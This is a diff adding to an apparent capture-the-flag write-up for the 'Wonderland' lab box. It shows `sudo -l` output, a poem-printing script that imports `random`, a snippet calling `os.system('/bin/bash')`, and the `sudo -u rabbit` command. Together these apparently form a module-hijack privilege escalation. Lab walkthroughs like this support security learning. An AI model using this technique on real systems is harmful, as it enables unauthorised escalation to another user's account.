@@ -139,3 +139,39 @@ alice@wonderland:~$
 
 
 ```
+alice@wonderland:~$ sudo -l
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+```
+import random
+poem = """The sun was shining on the sea,
+Shining with all his might:
+He did his very best to make
+The billows smooth and bright —
+And this was odd, because it was
+The middle of the night.
+
+...
+for i in range(10):
+    line = random.choice(poem.split("\n"))
+    print("The line was:\t", line)
+
+```
+
+
+```
+import os
+
+os.system('/bin/bash')
+
+```
+
+
+```
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
